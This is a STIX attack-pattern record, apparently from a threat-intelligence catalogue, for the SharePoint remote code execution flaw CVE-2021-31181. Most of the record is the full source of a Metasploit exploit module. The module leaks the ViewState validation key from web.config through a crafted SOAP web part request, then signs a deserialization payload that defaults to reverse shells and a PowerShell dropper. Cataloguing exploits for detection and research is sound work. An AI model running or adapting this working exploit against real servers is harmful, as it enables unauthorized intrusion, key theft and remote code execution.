{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0e0bf379-3533-49d5-9f7c-8de7ab9fb48e",
    "created": "2024-08-14T16:54:51.755536Z",
    "modified": "2024-08-14T16:54:51.755541Z",
    "name": "Microsoft SharePoint Unsafe Control and ViewState RCE",
    "description": " The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution when deserialized.  Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sharepoint_unsafe_control.rb",
            "external_id": "sharepoint_unsafe_control.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-31181"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Sharepoint\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  XML_NS = {\n    'wpp' => 'http://microsoft.com/sharepoint/webpartpages',\n    'soap' => 'http://www.w3.org/2003/05/soap-envelope',\n    'xsi' => 'http://www.w3.org/2001/XMLSchema-instance',\n    'xsd' => 'http://www.w3.org/2001/XMLSchema'\n  }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft SharePoint Unsafe Control and ViewState RCE',\n        'Description' => %q{\n          The EditingPageParser.VerifyControlOnSafeList method fails to properly validate user supplied data. This\n          can be leveraged by an attacker to leak sensitive information in rendered-preview content. This module will\n          leak the ViewState validation key and then use it to sign a crafted object that will trigger code execution\n          when deserialized.\n\n          Tested against SharePoint 2019 and SharePoint 2016, both on Windows Server 2016.\n        },\n        'Author' => [\n          'Unknown', # Reported to HP ZDI team, Vulnerability discovery\n          'Spencer McIntyre', # Module\n          'wvu' # Module\n        ],\n        'References' => [\n          [ 'CVE', '2021-31181' ],\n          [ 'ZDI', '21-573' ],\n          [ 'URL', 'https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability' ]\n        ],\n        'DisclosureDate' => '2021-05-11',\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :psh_invokewebrequest,\n                'PAYLOAD' => 'windows/x64/meterpreter_reverse_https'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 2,\n        'DefaultOptions' => {\n          'DotNetGadgetChain' => :TypeConfuseDelegate\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('VALIDATION_KEY', [false, 'ViewState validation key']),\n      OptString.new('COOKIE', [false, 'SharePoint cookie if you have one']),\n      OptString.new('SP_LIST', [true, 'SharePoint site SPList', 'Documents']),\n      # \"Promote\" these advanced options so we don't have to pass around our own\n      OptString.new('HttpUsername', [false, 'SharePoint username']),\n      OptString.new('HttpPassword', [false, 'SharePoint password'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def username\n    datastore['HttpUsername']\n  end\n\n  def password\n    datastore['HttpPassword']\n  end\n\n  def cookie\n    datastore['COOKIE']\n  end\n\n  def vuln_builds\n    # https://docs.microsoft.com/en-us/officeupdates/sharepoint-updates\n    # https://buildnumbers.wordpress.com/sharepoint/\n    # Patched in May of 2021\n    [\n      [Rex::Version.new('15.0.0.0'), Rex::Version.new('15.0.0.5337')], # SharePoint 2013\n      [Rex::Version.new('16.0.0.0'), Rex::Version.new('16.0.0.5149')], # SharePoint 2016\n      [Rex::Version.new('16.0.0.10000'), Rex::Version.new('16.0.0.10373')] # SharePoint 2019\n    ]\n  end\n\n  def check\n    build = sharepoint_get_version('cookie' => cookie)\n\n    if build.nil?\n      return CheckCode::Unknown('Failed to retrieve the SharePoint version number')\n    end\n\n    if vuln_builds.any? { |build_range| build.between?(*build_range) }\n      return CheckCode::Appears(\"SharePoint #{build} is a vulnerable build.\")\n    end\n\n    CheckCode::Safe(\"SharePoint #{build} is not a vulnerable build.\")\n  end\n\n  def exploit\n    if (username.blank? && password.blank?)\n      if cookie.blank?\n        fail_with(Failure::BadConfig, 'HttpUsername and HttpPassword or COOKIE are required for exploitation')\n      end\n\n      print_warning('Using the specified COOKIE for authentication')\n    end\n\n    if (@validation_key = datastore['VALIDATION_KEY'])\n      print_status(\"Using ViewState validation key #{@validation_key}\")\n    else\n      leak_web_config\n    end\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager\n    when :psh_stager\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    end\n  end\n\n  def leak_web_config\n    print_status('Leaking the ViewState validation key...')\n\n    web_id = sharepoint_get_site_web_id('cookie' => cookie)\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the site web ID') unless web_id\n\n    webpart = <<~WEBPART\n      <%@ Register TagPrefix=\"WebPartPages\" Namespace=\"Microsoft.SharePoint.WebPartPage\" Assembly=\"Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\" %>\n      <%@ Register TagPrefix=\"att\" Namespace=\"System.Web.UI.WebControls \" Assembly=\"System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" %>\n    WEBPART\n    webpart << Nokogiri::XML(<<-WEBPART, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)\n      <WebPartPages:XsltListFormWebPart id=\"id01\" runat=\"server\" ListDisplayName=\"#{datastore['SP_LIST'].encode(xml: :text)}\" WebId=\"{#{web_id.encode(xml: :text)}}\">\n        <DataSources>\n          <att:xmldatasource runat=\"server\" id=\"XDS1\"\n            XPath=\"/configuration/system.web/machineKey\"\n            datafile=\"c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config\" />\n        </DataSources>\n        <xsl>\n            <xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n                <xsl:output method=\"xml\" indent=\"yes\" />\n                <xsl:template match=\"/\">\n                    <xsl:copy-of select=\".\" />\n                </xsl:template>\n            </xsl:stylesheet>\n        </xsl>\n      </WebPartPages:XsltListFormWebPart>\n    WEBPART\n\n    envelope = '<?xml version=\"1.0\" encoding=\"utf-8\"?>'\n    envelope << Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)\n      <soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\n        <soap12:Body>\n          <RenderWebPartForEdit xmlns=\"http://microsoft.com/sharepoint/webpartpages\">\n            <webPartXml>#{webpart.encode(xml: :text)}</webPartXml>\n          </RenderWebPartForEdit>\n        </soap12:Body>\n      </soap12:Envelope>\n    ENVELOPE\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx'),\n      'cookie' => cookie,\n      'ctype' => 'application/soap+xml; charset=utf-8',\n      'data' => envelope\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    unless res.code == 200\n      fail_with(Failure::NotFound, \"Failed to retrieve #{normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx')}\")\n    end\n\n    xml_response = res.get_xml_document\n    if xml_response.nil?\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (non-XML response body)')\n    end\n\n    xml_result = xml_response.xpath('//wpp:RenderWebPartForEditResult', XML_NS)&.text\n    unless xml_result\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //wpp:RenderWebPartForEditResult)')\n    end\n\n    xml_result = Nokogiri::XML(xml_result)\n    web_part_pages = Nokogiri::XML(xml_result.xpath('//Properties').text)\n    unless web_part_pages&.root\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //Properties)')\n    end\n\n    unless (preview = web_part_pages.root.attr('__designer:Preview'))\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing attribute: __desiginer:Preview)')\n    end\n    preview = Nokogiri::HTML(CGI.unescapeHTML(preview))\n    unless (@validation_key = preview.at('//machinekey/@validationkey')&.text)\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //machinekey/@validationkey)')\n    end\n\n    print_good(\"ViewState validation key: #{@validation_key}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    sharepoint_execute_command_via_viewstate(cmd, @validation_key, { 'cookie' => cookie })\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-05-11",
    "x_mitre_platforms": [
        "win'"
    ]
}